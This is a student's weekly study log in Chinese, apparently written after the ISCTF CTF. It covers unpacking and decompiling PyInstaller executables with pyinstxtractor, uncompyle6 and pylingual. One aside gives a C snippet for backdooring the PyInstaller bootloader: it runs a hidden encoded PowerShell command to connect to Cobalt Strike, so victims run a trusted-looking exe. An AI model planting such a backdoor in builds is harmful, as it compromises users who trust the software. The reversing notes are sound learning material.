# 完成事项</font>
+ ISCTF做了六道逆向(还有一个misc里的java,不知道算不算进去)
# 下周待做事项</font>
+ 复习高数线代
+ 复习c语言
# 本周学习总结</font>
...
+ PyInstaller 的 exe 并不是纯 Python，它前半段是一个 C 写的 bootloader（run.exe）。
+ 这段 C 代码负责：
解压自身 → 加载 python3x.dll → 把 PYZ.pyz 挂进解释器 → import 你的主模块
+ 想解包我们也要用打包工具PyInstaller,下载之后把目标文件和下载在的内容放在一个文件夹里
+ 命令为py PyInstaller.py 目标.xx
+ 然后就能得到一个文件夹,这个时候我们其实就能把它们当成等效于一般程序分析时ida左边的东西了
![屏幕截图](./img/屏幕截图%202025-12-09%20192819.png)
+ 第一个文件夹是解压后的PYZ.pyz，你可以在这里看到你程序引用的所有库源码（.pyc 文件）。
+ 外层是驱动依赖,调用设计,初始化模块.......等等我还看不懂的东西
...
+ 这里插个解说,uncmopyle最多支持到＜python3.10,并且不同的版本有一个对应的magic number,使用不兼容还得改那个数字,非常麻烦
+ 但这种脚本小子行径称心快意,我怎会想不到?我第一遍失败就去找网站了,没一个能用的
```
方案四：等待工具更新（现实选择）
...
// 求我当时看见这句话的心理阴影面积
```
+ 最后我实在绷不住了,第三天晚上求助高人给我一个反编译网站,高人确实给了,还是我之前就试过的
+ 我当时也就想着死马当活马医,拖进去再看看得了
+ .......这回就行了,也不无法编译了,也不说我文件损坏了,这下就啥问题都没了,何意味啊,我见鬼了吗???
+ https://pylingual.io/
+ 这是最终确认有效的网站,是我喜欢的脚本,直接下载到本地
## 搜索拓展并总结一下这类题
| 步骤     | 工具 / 命令                          | 关键产出                             | 解说                    |
| ------ | -------------------------------- | -------------------------------- | --------------------- |
| ① 识别壳  | `strings \| grep -i pyinstaller` | 出现 `pyi-windows-manifest` 字样即可确认 | 先判壳，再决定后续方案           |
| ② 解包   | `pyinstxtractor.py xxx.exe`      | 得到 `xxx.exe_extracted/`          | 支持 2.x-3.13，一步到位      |
| ③ 定位入口 | 找同名 `.pyc` 或 `main.pyc`          | 主模块字节码                           | 文件名规律：exe 名 == 主模块    |
| ④ 反编译  | 本地：`uncompyle6` / `decompyle3`   | `.py` 源码                         | 版本滞后 ≤ 3.11；3.12+ 需在线 |
| ⑤ 补全魔法 | `xx.pyc` 修复头                     | 添加 16 B 魔数 & 时间戳                 | 提取时头被截，需手动补回          |
+ PyInstaller 运行机制👇（看懂外层文件）
+ 1 bootloader（C 写）→ 先跑 pyiboot01_bootstrap.pyc
+ 2 bootstrap 加载 pythonXX.dll → 初始化解释器
+ 3 archive importer (pyimod02_importers.pyc) 把 PYZ.pyz 当 zip 挂到 sys.meta_path
+ 4 解释器 import 主模块 → 你的代码开始跑
+ ps：改 bootloader 可留后门，见 pyinstaller/bootloader/Windows-64bit/run.exe 源码
+ 留后门就是在 C 源码里插一段恶意逻辑，例如：
```c
复制
/* 在 pyi_main.c 里随手加一行 */
if (strstr(GetCommandLineA(), "--check")) {
    WinExec("powershell -enc ...", SW_HIDE);   // 上线 CS
}
然后重新编译 run.exe，再用 PyInstaller 打包：pyinstaller your.spec --bootloader myrun.exe。
受害者运行的是“官方图标 + 官方签名”的 exe，实际上最先执行的是攻击者的 C 代码，Python 层毫无感知。
```
+ 常见坑与技巧👇
+ 1 “Bad MAGIC” → 用 pyc_header_fix.py 补 16 B 头（03f3 0d0a ...）。(但是直接扔网站人家可不管你这的那的,算是非常简单的破解方法了)
+ 2 混淆源码 → PyInstaller 本身无混淆，但作者常带 pyarmor 壳；先脱 PyInstaller，再看 .so / .pyd 是否被 PyArmor 加密。
+ 3 资源文件 → xxx.exe_extracted/_internal/ 或 *.pkg 里找 flag/密钥/配置。
+ 4 打包遗漏 → 若 PYZ.pyz 不存在，说明作者用 --onefile 但手动删了 archive，可尝试 pyinstxtractor --onefile 自动拼接。
...
+ 它的原理基本和我之前想过的一种可能性的差不多,我们需要利用陷阱点得到解包完成的程序,找到OEP(原始程序入口点),再把被解包完成之后的程序Dump出来
+ 搞人心态的来了,我的x64打不开程序,x32运行有bug,olly没有dump键,三个动调程序全是残废(我真的会一直红温的)
